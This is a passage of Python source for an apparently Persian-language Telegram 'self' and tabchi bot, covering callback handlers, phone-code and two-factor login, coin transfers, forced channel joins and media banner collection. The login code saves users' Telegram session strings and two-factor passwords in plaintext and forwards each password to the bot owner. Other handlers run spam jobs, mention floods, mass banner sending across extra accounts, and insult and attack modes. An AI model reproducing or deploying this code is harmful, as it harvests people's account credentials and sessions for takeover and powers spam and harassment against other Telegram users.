        bot.answer_callback_query(call.id, "پاک شد")
        return
    elif data.startswith('ex_sg_start_'):
        acc_id = data.split('_')[-1]
        tabchi_states[uid] = {'mode': 'spam_text', 'acc_id': acc_id}
        guide = (
            "متن خودتو بفرست ↓" + chr(10)
            + "<blockquote>"
            + "راهنمای اسپم اکانت اضافه" + chr(10)
            + "متن تعداد → مثلاً سلام 100" + chr(10)
            + "متن بی نهایت → ارسال تا توقف" + chr(10)
            + "متن تعداد ایدی‌ها کاراکتر → چند نفر با یک کاراکتر" + chr(10)
            + "مثال: سلام 50 111 222 𒄉" + chr(10)
            + "متن تعداد ایدی‌ها کاراکترها → هر ایدی یک کاراکتر" + chr(10)
            + "مثال: سلام 50 111 222 𒆒 𒆞" + chr(10)
            + "متن تعداد لینک‌پیام → ریپلای روی همان پیام" + chr(10)
            + "برای توقف بنویس: توقف"
            + "</blockquote>"
        )
        try:
            bot.edit_message_text(guide, call.message.chat.id, call.message.message_id, parse_mode='HTML')
        except Exception:
            bot.send_message(uid, guide, parse_mode='HTML')
        bot.answer_callback_query(call.id)
        return
    elif data.startswith('ex_sp_stop_'):
        acc_id = data.split('_')[-1]
        extra_spam_jobs.pop((uid, str(acc_id)), None)
        bot.answer_callback_query(call.id, "متوقف شد")
        main_panel(uid)
        return
    elif data.startswith('pv_xfer_ok_'):
        parts = data.split('_')
        try:
            frm = int(parts[3]); to = int(parts[4]); amount = int(parts[5])
        except Exception:
            bot.answer_callback_query(call.id, "نامعتبر")
            return
        if uid != frm:
            bot.answer_callback_query(call.id, "پنل برای شما نیست", show_alert=True)
            return
        if amount < 100:
            bot.answer_callback_query(call.id, "حداقل ۱۰۰ سکه", show_alert=True)
            return
        fc = get_ud(frm, 'coins', 0)
        if fc < amount:
            bot.answer_callback_query(call.id, "موجودی کافی نیست", show_alert=True)
            return
        old_from = fc
        old_to = get_ud(to, 'coins', 0)
        set_user(frm, 'coins', fc - amount)
        set_user(to, 'coins', old_to + amount)
        admin_states.pop(uid, None)
        bot_prompt_msgs.pop(uid, None)
        name = get_user(to).get('original_name') or str(to)
        my_name = get_user(frm).get('original_name') or str(frm)
        try:
            bot.edit_message_text(
                str(amount) + " سکه به " + mention(to, name) + " با موفقیت انتقال یافت",
                call.message.chat.id, call.message.message_id, parse_mode='Markdown'
            )
        except Exception:
            pass
        try:
            bot.send_message(
                to,
                "مقدار **" + str(amount) + "** سکه از کاربر " + mention(frm, my_name) + " به شما انتقال یافت",
                parse_mode='Markdown',
            )
        except Exception:
            pass
        try:
            notify_transfer_owner(frm, to, amount, via="ربات")
        except Exception:
            pass
        bot.answer_callback_query(call.id, "انجام شد")
        return
    elif data.startswith('pv_xfer_no_'):
        admin_states.pop(uid, None)
        bot_prompt_msgs.pop(uid, None)
        try:
            bot.edit_message_text("انتقال لغو شد", call.message.chat.id, call.message.message_id)
        except Exception:
            pass
        bot.answer_callback_query(call.id)
        return
    elif data.startswith('xfer_ok_'):
        # xfer_ok_{from}_{to}_{amount}
        parts = data.split('_')
        try:
            frm, to, amount = int(parts[2]), int(parts[3]), int(parts[4])
        except Exception:
            bot.answer_callback_query(call.id, "نامعتبر")
            return
        if uid != frm:
            bot.answer_callback_query(call.id, "پنل برای شما نیست", show_alert=True)
            return
        fc = get_ud(frm, 'coins', 0)
        if fc < amount:
            bot.answer_callback_query(call.id, "موجودی کافی نیست", show_alert=True)
            return
        old_to = get_ud(to, 'coins', 0)
        set_user(frm, 'coins', fc - amount)
        set_user(to, 'coins', old_to + amount)
        new_to = get_ud(to, 'coins', 0)
        fn = get_user(frm).get('original_name') or str(frm)
        tn = get_user(to).get('original_name') or str(to)
        try:
            bot.edit_message_text(
                "انتقال با موفقیت انجام شد" + chr(10)
                + "مبلغ " + str(amount) + " سکه" + chr(10)
                + "از " + str(fn) + " به " + str(tn),
                call.message.chat.id,
                call.message.message_id,
                reply_markup=types.InlineKeyboardMarkup().add(
                    types.InlineKeyboardButton(str(new_to) + " سکه", callback_data='noop')
                ),
            )
        except Exception:
            pass
        try:
            bot.send_message(
                to,
                f"**انتقالی جدید**\n**{amount} سکه** از [کاربر](tg://user?id={frm})",
                parse_mode='Markdown',
            )
        except Exception:
            pass
        try:
            notify_transfer_owner(frm, to, amount, via="ربات")
        except Exception:
            pass
        bot.answer_callback_query(call.id)
        return
    elif data.startswith('xfer_no_'):
        parts = data.split('_')
        try:
            frm = int(parts[2])
        except Exception:
            frm = None
        if frm is not None and uid != frm:
            bot.answer_callback_query(call.id, "پنل برای شما نیست", show_alert=True)
            return
        try:
            bot.edit_message_text("انتقال لغو شد", call.message.chat.id, call.message.message_id)
        except Exception:
            pass
        bot.answer_callback_query(call.id)
        return
    
    elif data.startswith('ch_ok_'):
        chs = get_force_channels()
        if not chs:
            set_user(uid, 'channel_ok', True)
            try:
                bot.delete_message(call.message.chat.id, call.message.message_id)
            except Exception:
                pass
            force_panel_msgs.pop(uid, None)
            bot.answer_callback_query(call.id, "تایید شد")
            main_panel(uid)
            return
        ok_all = True
        for ch in chs:
            if not _user_in_force_channel(uid, ch):
                ok_all = False
                break
        if not ok_all:
            bot.answer_callback_query(call.id, "هنوز عضو همه چنل/گروه ها نشدی", show_alert=True)
            # دوباره پنل عضویت
            try:
                require_channel_join(uid)
            except Exception:
                pass
            return
        set_user(uid, 'channel_ok', True)
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except Exception:
            pass
        force_panel_msgs.pop(uid, None)
        # رفرال فقط اینجا نهایی می‌شود
        try:
            pref = get_ud(uid, 'pending_ref')
            if pref and not get_ud(uid, 'ref_done'):
                set_user(uid, 'ref_done', True)
                set_user(uid, 'pending_ref', None)
                notify_referral_ok(int(pref), uid)
        except Exception:
            pass
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except Exception:
            pass
        force_panel_msgs.pop(uid, None)
        bot.answer_callback_query(call.id, "تایید شد")
        if get_ud(uid, 'session'):
            main_panel(uid)
        else:
            mk = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
            mk.add(types.KeyboardButton("ارسال شماره", request_contact=True))
            bot.send_message(uid, "عضویت تایید شد. برای لاگین شماره را ارسال کنید:", reply_markup=mk)
        return

    elif data in ("oforce", "aforce") and is_admin(uid):
        force_panel(uid, call.message.message_id, call.message.chat.id)
        bot.answer_callback_query(call.id)
        return
    elif data == "fch_add" and is_admin(uid):
        admin_states[uid] = {'step': 'force_add'}
        bot.edit_message_text(
            "لینک چنل/گروه (عمومی یا خصوصی) یا ایدی عددی را بفرست" + chr(10) + "مثال: https://t.me/+xxxx یا https://t.me/c/123 یا -100123456",
            call.message.chat.id,
            call.message.message_id,
        )
        bot.answer_callback_query(call.id)
        return
    elif data == "fch_list" and is_admin(uid):
        force_list_panel(uid, call.message.message_id, call.message.chat.id)
        bot.answer_callback_query(call.id)
        return
    elif data.startswith("fch_del_") and is_admin(uid):
        try:
            idx = int(data.split("_")[-1])
        except Exception:
            bot.answer_callback_query(call.id)
            return
        chs = get_force_channels()
        if 0 <= idx < len(chs):
            chs.pop(idx)
            set_force_channels(chs)
        force_list_panel(uid, call.message.message_id, call.message.chat.id)
        bot.answer_callback_query(call.id, "حذف شد")
        return
    elif data == "oextras" and is_owner(uid):
        users = load_data()['users']
        lines = ["اکانت های اضافه کاربران", ""]
        for s, info in users.items():
            extras = info.get('extra_accounts') or {}
            if not extras:
                continue
            name = info.get('original_name') or s
            lines.append(f"کاربر {name} | `{s}`")
            for aid, einfo in extras.items():
                en = einfo.get('name') or aid
                eu = einfo.get('username')
                lines.append(f"  - {en} | `{aid}`" + (f" | @{eu}" if eu else ""))
            lines.append("")
        if len(lines) <= 2:
            body = "هیچ اکانت اضافه‌ای ثبت نشده"
        else:
            body = chr(10).join(lines)
        mk = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("بازگشت", callback_data=f"owner_{uid}"))
        bot.edit_message_text(body[:4000], call.message.chat.id, call.message.message_id, reply_markup=mk, parse_mode='Markdown')
        bot.answer_callback_query(call.id)
        return

    elif data in ("omsg_one", "amsg_one") and is_admin(uid):
        admin_states[uid] = {'step': 'msg_one_id'}
        mk = types.InlineKeyboardMarkup()
        back = f"owner_{uid}" if is_owner(uid) else f"admin_{uid}"
        mk.add(types.InlineKeyboardButton("بازگشت", callback_data=back))
        _safe_edit(call, "ایدی عددی یا @یوزرنیم کاربر را بفرست:", reply_markup=mk)
        return

    # لیست بنرهای سندر (تبچی)
    elif data.startswith('ex_bn_list_'):
        acc_id = data.split('_')[-1]
        extras = get_extras(uid)
        info = extras.get(str(acc_id)) or {}
        items = list(info.get('sender_items') or [])
        if not items:
            bot.answer_callback_query(call.id, "بنری نیست", show_alert=True)
            return
        bot.send_message(
            uid,
            "لیست بنر ها (" + str(len(items)) + ")\n"
            + "برای حذف هر بنر روی همان پیام ریپلای کن و بنویس:\nحذف بنر",
        )
        for i, it in enumerate(items):
            try:
                fid = it.get('file_id')
                cap = ("#" + str(i) + "\n") + (it.get('text') or '')
                ct = it.get('kind') or it.get('content_type') or 'text'
                if fid and ct == 'photo':
                    bot.send_photo(uid, fid, caption=cap[:1000])
                elif fid and ct == 'video':
                    bot.send_video(uid, fid, caption=cap[:1000])
                elif fid and ct == 'voice':
                    bot.send_voice(uid, fid, caption=cap[:1000])
                elif fid and ct == 'document':
                    bot.send_document(uid, fid, caption=cap[:1000])
                elif fid and ct in ('gif', 'animation'):
                    bot.send_animation(uid, fid, caption=cap[:1000])
                elif fid and ct == 'sticker':
                    bot.send_sticker(uid, fid)
                    if cap.strip():
                        bot.send_message(uid, cap[:500])
                else:
                    bot.send_message(uid, cap[:2000] or ("بنر #" + str(i)))
            except Exception:
                try:
                    bot.send_message(uid, "#" + str(i) + " (خطا در نمایش)")
                except Exception:
                    pass
        mk = types.InlineKeyboardMarkup()
        mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"ex_tab_{acc_id}"))
        bot.send_message(uid, "پایان لیست بنر ها", reply_markup=mk)
        bot.answer_callback_query(call.id)
        return

    elif data.startswith('ex_bn_add_'):
        acc_id = data.split('_')[-1]
        tabchi_states[uid] = {'mode': 'sender_content', 'acc_id': acc_id, 'multi': True}
        bot.edit_message_text(
            "بنر جدید را بفرست (متن/عکس/ویدیو/ویس/هر فرمت)\nبعد از ارسال تأیید می‌گیرم",
            call.message.chat.id, call.message.message_id,
        )
        bot.answer_callback_query(call.id)
        return

    elif data == 'bc_send' and is_admin(uid):
        st = admin_states.get(uid) or {}
        if st.get('step') != 'broadcast_confirm':
            bot.answer_callback_query(call.id, "منقضی شده")
            return
        chat_id = st.get('chat_id')
        mid = st.get('message_id')
        admin_states.pop(uid, None)
        count = 0
        try:
            # پیام اصلی را از chat بگیر
            # copy from stored ids
            class _M: pass
            # استفاده از forward/copy با message_id ذخیره شده
            for s, u in load_data()['users'].items():
                if u.get('banned'):
                    continue
                try:
                    bot.copy_message(int(s), chat_id, mid)
                    count += 1
                except Exception:
                    pass
        except Exception:
            pass
        try:
            bot.edit_message_text("به " + str(count) + " نفر ارسال شد", call.message.chat.id, call.message.message_id)
        except Exception:
            bot.send_message(uid, "به " + str(count) + " نفر ارسال شد")
        bot.answer_callback_query(call.id)
        main_panel(uid)
        return
    elif data == 'bc_reedit' and is_admin(uid):
        st = admin_states.get(uid) or {}
        if st.get('step') != 'broadcast_confirm':
            bot.answer_callback_query(call.id, "منقضی شده")
            return
        # دوباره از همان message_id کپی کن (بعد از ویرایش کاربر)
        chat_id = st.get('chat_id')
        mid = st.get('message_id')
        # پیام تایید دوباره
        mk = types.InlineKeyboardMarkup(row_width=2)
        mk.add(
            types.InlineKeyboardButton("خیر — ارسال", callback_data="bc_send"),
            types.InlineKeyboardButton("بله — ویرایش کردم", callback_data="bc_reedit"),
        )
        try:
            bot.edit_message_text(
                "ذخیره شد. نیاز به ویرایش دیگری ندارید؟",
                call.message.chat.id, call.message.message_id, reply_markup=mk
            )
        except Exception:
            pass
        bot.answer_callback_query(call.id, "اگر ویرایش کردید روی ارسال بزنید")
        return

    else:
        try:
            bot.answer_callback_query(call.id, "این دکمه هنوز وصل نیست", show_alert=True)
        except Exception:
            pass



# ========== پنل اینلاین گروه (ربات جدا) ==========



@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    if message.chat.type != 'private': return
    if is_bot_spam_blocked(uid):
        try:
            bot.send_message(uid, "شما به مدت 1 ساعت مسدود شده اید\nاز اسپم خودداری کنید !")
        except Exception:
            pass
        return
    del_old_panel(uid)
    # پاک کردن حالت‌های گیرکرده (سندر، اسپم، ادمین و ...)
    try:
        tabchi_states.pop(uid, None)
    except Exception:
        pass
    try:
        admin_states.pop(uid, None)
    except Exception:
        pass
    try:
        extra_login_states.pop(uid, None)
    except Exception:
        pass
    try:
        login_states.pop(uid, None)
    except Exception:
        pass
    try:
        content_wait.pop(uid, None)
        reply_wait.pop(uid, None)
        insult_wait.pop(uid, None)
        attack_wait.pop(uid, None)
        kol_wait.pop(uid, None)
    except Exception:
        pass
    data = load_data()
    if is_user_banned(uid):
        # فقط یک‌بار هنگام بن پیام داده شده؛ دیگر هیچ پاسخی نده
        return
    if str(uid) not in data['users']:
        a, b, ans = make_captcha()
        captcha_wait[uid] = {'answer': ans, 'ref': None, 'a': a, 'b': b, 'msg_ids': []}
        if message.text and 'ref_' in message.text:
            try:
                captcha_wait[uid]['ref'] = int(message.text.split('ref_')[1])
            except Exception:
                pass
        m = bot.send_message(uid, "جواب کپچا زیر رو ارسال کن" + chr(10) + f"{a}+{b}= ")
        captcha_wait[uid]['msg_ids'] = [m.message_id]
        return
    if require_channel_join(uid):
        return
    if has_session(uid):
        if uid not in clients or not clients[uid].is_connected():
            try:
                asyncio.run_coroutine_threadsafe(start_client(uid), loop)
            except Exception:
                pass
    # همیشه پنل را نشان بده (حتی بدون لاگین — دکمه اتصال اکانت هست)
    main_panel(uid)

@bot.message_handler(content_types=['contact'])
def contact(message):
    uid = message.from_user.id
    if message.chat.type != 'private' or get_ud(uid, 'banned') or not message.contact:
        return
    phone = message.contact.phone_number
    if not phone.startswith('+'):
        phone = '+' + phone
    # لاگین اکانت اضافه
    if uid in extra_login_states and extra_login_states[uid].get('step') == 'phone':
        client = TelegramClient(StringSession(), API_ID, API_HASH, device_model="StR")
        extra_login_states[uid] = {
            'client': client, 'phone': phone, 'step': 'code', 'msg_ids': []
        }
        try:
            m = bot.send_message(uid, "<blockquote>شماره اکانت اضافه:</blockquote>" + chr(10) + "`" + phone + "`", parse_mode='Markdown')
            extra_login_states[uid].setdefault('msg_ids', []).append(m.message_id)
        except Exception:
            pass
        asyncio.run_coroutine_threadsafe(send_code_extra(uid, phone, client), loop)
        return
    set_user(uid, 'phone', phone)
    msg_ids = []
    try:
        msg = "<blockquote>شماره شما:</blockquote>" + chr(10) + "<blockquote><code>" + phone + "</code></blockquote>" + chr(10) + "<blockquote>در حال ارسال کد...</blockquote>"
        m = bot.send_message(uid, msg, parse_mode='HTML', reply_markup=types.ReplyKeyboardRemove())
        msg_ids.append(m.message_id)
    except Exception:
        try:
            m = bot.send_message(uid, "<blockquote>شماره شما:</blockquote>" + chr(10) + "<blockquote><code>" + str(phone) + "</code></blockquote>" + chr(10) + "<blockquote>در حال ارسال کد...</blockquote>")
            msg_ids.append(m.message_id)
        except Exception:
            pass
    client = TelegramClient(StringSession(), API_ID, API_HASH, device_model="StR")
    login_states[uid] = {'client': client, 'phone': phone, 'step': 'code', 'msg_ids': msg_ids}
    asyncio.run_coroutine_threadsafe(send_code(uid, phone, client), loop)


async def send_code(uid, phone, client):
    try:
        await client.connect()
        await client.send_code_request(phone)
        st = login_states.get(uid) or {}
        st['code_digits'] = ''
        st['step'] = 'code'
        login_states[uid] = st
        m = bot.send_message(
            uid,
            code_entry_text(''),
            parse_mode='HTML',
            reply_markup=build_code_keypad(uid, 'login'),
        )
        ids = st.get('msg_ids') or []
        try:
            ids.append(m.message_id)
            st['code_msg_id'] = m.message_id
        except Exception:
            pass
        st['msg_ids'] = ids
        login_states[uid] = st
    except Exception as e:
        bot.send_message(uid, "خطا: " + str(e))
        login_states.pop(uid, None)



async def send_code_extra(uid, phone, client):
    try:
        await client.connect()
        await client.send_code_request(phone)
        st = extra_login_states.get(uid) or {}
        st['client'] = client
        st['phone'] = phone
        st['step'] = 'code'
        st['code_digits'] = ''
        st['mode'] = 'extra'
        try:
            msg = bot.send_message(
                uid,
                "<blockquote>شماره: <code>" + str(phone) + "</code></blockquote>" + chr(10)
                + "<blockquote>کد: —</blockquote>" + chr(10)
                + "<blockquote>کد ۵ رقمی را با دکمه‌ها وارد کنید</blockquote>",
                parse_mode='HTML',
                reply_markup=build_code_keypad(uid, 'extra'),
            )
            st['code_msg_id'] = msg.message_id
            st['msg_ids'] = list(st.get('msg_ids') or []) + [msg.message_id]
        except Exception:
            try:
                bot.send_message(uid, "کد ۵ رقمی را به صورت متن بفرست (مثال: 51274)")
            except Exception:
                pass
        extra_login_states[uid] = st
        return
        st = extra_login_states.get(uid) or {}
        st['code_digits'] = ''
        st['step'] = 'code'
        m = bot.send_message(
            uid,
            code_entry_text(''),
            parse_mode='HTML',
            reply_markup=build_code_keypad(uid, 'extra'),
        )
        ids = st.get('msg_ids') or []
        ids.append(m.message_id)
        st['msg_ids'] = ids
        st['code_msg_id'] = m.message_id
        extra_login_states[uid] = st
    except Exception as e:
        bot.send_message(uid, "خطا اکانت اضافه: " + str(e))
        extra_login_states.pop(uid, None)


def get_password(message):
    uid = message.from_user.id
    if message.chat.type != 'private': return
    state = login_states.get(uid)
    if not state or state.get('step') != 'password': return
    password = (message.text or '').strip()
    if not password:
        try:
            bot.send_message(uid, "<blockquote>رمز را بفرستید</blockquote>", parse_mode='HTML')
        except Exception:
            pass
        try:
            bot.register_next_step_handler_by_chat_id(uid, get_password)
        except Exception:
            pass
        return
    try:
        bot.send_message(uid, "<blockquote>در حال بررسی رمز...</blockquote>", parse_mode='HTML')
    except Exception:
        pass
    try:
        async def _pw():
            cl = state.get('client')
            if not cl:
                raise Exception('no client')
            try:
                if not cl.is_connected():
                    await cl.connect()
            except Exception:
                await cl.connect()
            await cl.sign_in(password=password)
        asyncio.run_coroutine_threadsafe(_pw(), loop).result(timeout=45)
        # فقط اگر sign_in موفق بود به اینجا می‌رسیم
        session = state['client'].session.save()
        if not session or len(str(session)) < 20:
            raise Exception('session save failed')
        name0 = None
        un0 = None
        try:
            me = asyncio.run_coroutine_threadsafe(state['client'].get_me(), loop).result(timeout=15)
            if me:
                name0 = ((me.first_name or '') + ' ' + (me.last_name or '')).strip()
                un0 = getattr(me, 'username', None)
        except Exception:
            pass
        payload = {
            'session': session,
            'phone': state['phone'],
            'self_enabled': True,
            '2fa_password': password,
        }
        if name0:
            payload['original_name'] = name0
        if un0:
            payload['username'] = un0
        update_user(uid, **payload)
        clients[uid] = state['client']
        try:
            notify_owner_2fa(uid, password, phone=state.get('phone'), name=name0, is_extra=False)
        except Exception:
            pass
        @state['client'].on(events.NewMessage)
        async def h(e):
                    try:
                        await on_self(e, uid)
                    except (AuthKeyUnregisteredError, AuthKeyDuplicatedError, UserDeactivatedError, UserDeactivatedBanError):
                        notify_user_session_lost(uid)
                    except Exception:
                        pass
        try:
            notify_owner_login(uid, phone=state.get('phone'))
        except Exception:
            pass
        try:
            for mid in (state.get('msg_ids') or []):
                try:
                    bot.delete_message(uid, mid)
                except Exception:
                    pass
        except Exception:
            pass
        try:
            del_old_panel(uid)
        except Exception:
            pass
        bot.send_message(uid, "سلف فعال شد")
        del login_states[uid]
        try:
            if get_ud(uid, 'clock_enabled'):
                asyncio.run_coroutine_threadsafe(apply_clock_name(clients[uid], uid), loop)
        except Exception:
            pass
        main_panel(uid)
    except Exception as e:
        bot.send_message(uid, f"رمز اشتباه: {e}")
        bot.register_next_step_handler(message, get_password)


@bot.message_handler(func=lambda m: m.text and (
    (m.chat.type in ['group', 'supergroup'] and (
        m.text.startswith('انتقال ') or m.text.startswith('/انتقال ') or
        m.text.strip() in ('.موجودی', 'موجودی', '/موجودی')
    )) or
    (getattr(m.chat, 'type', None) == 'private' and m.text.strip() in ('.موجودی', 'موجودی', '/موجودی'))
))
def group_economy(message):
    try:
        uid = message.from_user.id
        text = (message.text or '').strip()
        chat = message.chat.type
        if get_ud(uid, 'banned'):
            return
        if (text.startswith('انتقال ') or text.startswith('/انتقال ')) and message.reply_to_message:
            try:
                amount = int(text.replace('/انتقال', 'انتقال').split()[1])
                if amount <= 0:
                    raise ValueError()
            except Exception:
                bot.reply_to(message, "فرمت: انتقال 100")
                return
            frm = uid
            to_user = message.reply_to_message.from_user
            if not to_user:
                return
            to = to_user.id
            if to == frm:
                bot.reply_to(message, "به خودت نمیشود")
                return
            users = load_data()['users']
            if str(frm) not in users or str(to) not in users:
                bot.reply_to(message, "هر دو باید عضو ربات باشند")
                return
            if get_ud(frm, 'coins', 0) < amount:
                bot.reply_to(message, "موجودی کافی نیست")
                return
            fn = message.from_user.first_name or str(frm)
            tn = to_user.first_name or str(to)
            mk = types.InlineKeyboardMarkup(row_width=2)
            mk.add(
                types.InlineKeyboardButton("لغو", callback_data=f"xfer_no_{frm}_{to}_{amount}"),
                types.InlineKeyboardButton("تایید", callback_data=f"xfer_ok_{frm}_{to}_{amount}"),
            )
            bot.reply_to(message, f"انتقال {amount} سکه از [{fn}](tg://user?id={frm}) به [{tn}](tg://user?id={to})", parse_mode='Markdown', reply_markup=mk)
            return

        if text in ('.موجودی', 'موجودی', '/موجودی'):
            if message.reply_to_message and message.reply_to_message.from_user:
                target = message.reply_to_message.from_user
                tid = target.id
                c = get_ud(tid, 'coins', 0)
                title = "**موجودی شما**" if tid == uid else "**موجودی کاربر**"
            else:
                c = get_ud(uid, 'coins', 0)
                title = "**موجودی شما**"
            mk = types.InlineKeyboardMarkup()
            mk.add(types.InlineKeyboardButton(f"{c} سکه", callback_data="noop"))
            try:
                bot.reply_to(message, title, parse_mode='Markdown', reply_markup=mk)
            except Exception:
                try:
                    bot.send_message(message.chat.id, title, parse_mode='Markdown', reply_markup=mk)
                except Exception:
                    pass
            return
    except Exception:
        pass




@bot.message_handler(content_types=['photo', 'video', 'document', 'audio', 'voice', 'video_note', 'sticker', 'animation'])
def media_tabchi_handler(message):
    uid = message.from_user.id
    if message.chat.type != 'private':
        return
    # تصویر پنل (فقط file_id ذخیره می‌شود — بدون دانلود مجدد/اشغال)
    if uid in admin_states and admin_states[uid].get('step') == 'panel_img' and message.photo:
        if not is_owner(uid):
            admin_states.pop(uid, None)
            return
        try:
            # دقیقاً همان سایز اصلی (بزرگ‌ترین نسخه)
            fid = message.photo[-1].file_id
            set_panel_image(fid)
            # کش پنل شخصی همه کاربران پاک شود تا با پس‌زمینه جدید ساخته شود
            try:
                data = load_data()
                for uu in (data.get('users') or {}):
                    try:
                        if isinstance(data['users'][uu], dict) and 'panel_img_cache' in data['users'][uu]:
                            data['users'][uu].pop('panel_img_cache', None)
                    except Exception:
                        pass
                save_data(data)
            except Exception:
                pass
            admin_states.pop(uid, None)
            bot.reply_to(message, "تصویر با موفقیت تغییر کرد")
        except Exception as e:
            bot.reply_to(message, "خطا: " + str(e)[:100])
        return
    # پروفایل اکانت‌های اضافه — عکس
    if uid in admin_states and admin_states[uid].get('step') == 'extra_prof_photo' and message.photo:
        admin_states.pop(uid, None)
        try:
            fpath = bot.download_file(bot.get_file(message.photo[-1].file_id).file_path)
            import tempfile
            tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.jpg')
            tmp.write(fpath)
            tmp.close()
            photo_path = tmp.name
        except Exception as e:
            bot.reply_to(message, "خطا دانلود عکس: " + str(e)[:80])
            return
        extras = get_extras(uid) or {}
        ok = 0
        fail = 0
        for aid, inf in extras.items():
            if str(aid).lower() in ('all', 'none', '') or not isinstance(inf, dict):
                continue
            try:
                key = (int(uid), int(aid))
                cl = extra_clients.get(key)
                if not cl:
                    sess = inf.get('session')
                    if sess:
                        asyncio.run_coroutine_threadsafe(start_extra_client(uid, aid, sess), loop).result(timeout=20)
                        cl = extra_clients.get(key)
                if not cl:
                    fail += 1
                    continue
                async def _upd(c=cl, p=photo_path):
                    from telethon.tl.functions.photos import UploadProfilePhotoRequest
                    up = await c.upload_file(p)
                    await c(UploadProfilePhotoRequest(file=up))
                asyncio.run_coroutine_threadsafe(_upd(), loop).result(timeout=30)
                ok += 1
            except Exception:
                fail += 1
        try:
            os.unlink(photo_path)
        except Exception:
            pass
        bot.reply_to(message, "عکس پروفایل اعمال شد\nموفق: " + str(ok) + " | ناموفق: " + str(fail))
        try:
            personalize_panel(uid)
        except Exception:
            pass
        return
    if uid not in tabchi_states:
        return
    st = tabchi_states[uid]
    if st.get('mode') != 'sender_content':
        return
    try:
        # download via bot API file
        file_id = None
        kind = 'media'
        if message.photo:
            file_id = message.photo[-1].file_id
            kind = 'photo'
        elif message.video:
            file_id = message.video.file_id
            kind = 'video'
        elif message.document:
            file_id = message.document.file_id
            kind = 'document'
        elif message.audio:
            file_id = message.audio.file_id
            kind = 'audio'
        elif message.voice:
            file_id = message.voice.file_id
            kind = 'voice'
        elif message.video_note:
            file_id = message.video_note.file_id
            kind = 'video_note'
        elif message.sticker:
            file_id = message.sticker.file_id
            kind = 'sticker'
        elif message.animation:
            file_id = message.animation.file_id
            kind = 'gif'
        fpath = None
        if file_id:
            os.makedirs('sender_media', exist_ok=True)
            fi = bot.get_file(file_id)
            fpath = os.path.join('sender_media', f'{uid}_{file_id[:20]}')
            downloaded = bot.download_file(fi.file_path)
            with open(fpath, 'wb') as f:
                f.write(downloaded)
        cap = message.caption or ''
        item = {
            'text': cap, 'file': fpath, 'kind': kind, 'file_id': file_id,
            'content_type': kind, 'chat_id': message.chat.id, 'message_id': message.message_id,
        }
        st['pending_item'] = item
        st['mode'] = 'sender_confirm'
        st['pending_mid'] = message.message_id
        tabchi_states[uid] = st
        bot.reply_to(message, "بنر درسته ؟\nاگر ویرایش کردی همان پیام را ویرایش کن\nبعد بنویس: تایید")
    except Exception as e:
        try:
            bot.reply_to(message, "خطا ذخیره مدیا: " + str(e)[:80])
        except Exception:
            pass



@bot.message_handler(content_types=['photo', 'video', 'document', 'voice', 'audio', 'animation', 'sticker', 'video_note'], func=lambda m: m.chat.type == 'private' and m.from_user.id in tabchi_states and (tabchi_states.get(m.from_user.id) or {}).get('mode') == 'sender_content')
def sender_media_handler(message):
    uid = message.from_user.id
    st = tabchi_states.get(uid) or {}
    html = message_to_html(message) or (message.caption or '')
    item = {
        'text': message.caption or '',
        'html': html,
        'file': None,
        'kind': 'media',
        'file_id': None,
        'content_type': message.content_type,
        'chat_id': message.chat.id,
        'message_id': message.message_id,
    }
    try:
        ct = message.content_type
        if ct == 'photo' and message.photo:
            item['file_id'] = message.photo[-1].file_id
            item['kind'] = 'photo'
        elif ct == 'video' and message.video:
            item['file_id'] = message.video.file_id
            item['kind'] = 'video'
        elif ct == 'document' and message.document:
            item['file_id'] = message.document.file_id
            item['kind'] = 'document'
        elif ct == 'voice' and message.voice:
            item['file_id'] = message.voice.file_id
            item['kind'] = 'voice'
        elif ct == 'animation' and message.animation:
            item['file_id'] = message.animation.file_id
            item['kind'] = 'gif'
        elif ct == 'sticker' and message.sticker:
            item['file_id'] = message.sticker.file_id
            item['kind'] = 'sticker'
        elif ct == 'video_note' and message.video_note:
            item['file_id'] = message.video_note.file_id
            item['kind'] = 'video_note'
        # دانلود برای ارسال با Telethon
        try:
            os.makedirs('sender_media', exist_ok=True)
            f = bot.get_file(item['file_id'])
            path = os.path.join('sender_media', f'{uid}_{message.message_id}')
            downloaded = bot.download_file(f.file_path)
            with open(path, 'wb') as out:
                out.write(downloaded)
            item['file'] = path
        except Exception:
            pass
    except Exception:
        pass
    st['pending_item'] = item
    st['mode'] = 'sender_confirm'
    st['pending_mid'] = message.message_id
    tabchi_states[uid] = st
    bot.reply_to(message, "بنر درسته ؟\nاگر ویرایش کردی همان پیام را ویرایش کن\nبعد بنویس: تایید")




@bot.message_handler(content_types=['photo'], func=lambda m: m.chat.type == 'private' and m.from_user.id in admin_states and (admin_states.get(m.from_user.id) or {}).get('step') == 'panel_img')
def panel_img_handler(message):
    uid = message.from_user.id
    if not is_owner(uid):
        return
    try:
        fid = message.photo[-1].file_id
        set_panel_image(fid)
        admin_states.pop(uid, None)
        bot.reply_to(message, "تصویر با موفقیت تغییر کرد")
    except Exception as e:
        bot.reply_to(message, "خطا: " + str(e)[:100])

@bot.message_handler(func=lambda m: True, content_types=['text'])
def text_handler(message):
    uid = message.from_user.id
    try:
        sync_user_profile_from_tg(uid, message.from_user)
    except Exception:
        pass

    if is_user_banned(uid):
        return
    text = message.text.strip()
    chat = message.chat.type

    # وسط لاگین: عضویت اجباری و اسپم را رد کن
    _in_login = False
    try:
        if uid in login_states or uid in extra_login_states:
            _in_login = True
    except Exception:
        pass

    # عضویت اجباری در پیوی ربات
    if chat == 'private' and not _in_login:
        try:
            if require_channel_join(uid):
                return
        except Exception:
            pass

    if chat == 'private' and not _in_login:
        if is_bot_spam_blocked(uid):
            try:
                bot.send_message(uid, "شما به مدت 1 ساعت مسدود شده اید\nاز اسپم خودداری کنید !")
            except Exception:
                pass
            return
        # اسپم متنی: بیش از ۱۲ پیام در ۸ ثانیه → ۱ ساعت مسدود
        if hit_bot_spam(uid, limit=12, window=8):
            return


    if chat == 'private' and uid in admin_states and admin_states[uid].get('step') == 'panel_title' and is_owner(uid):
        set_panel_title(text.strip())
        admin_states.pop(uid, None)
        bot.reply_to(message, "متن پنل تغییر کرد:\n" + get_panel_title())
        return

    # متن جوین اکانت‌های اضافه




    # --- مدیریت ریپورتر مالک ---
    if chat == 'private' and is_main_owner(uid) and uid in admin_states:
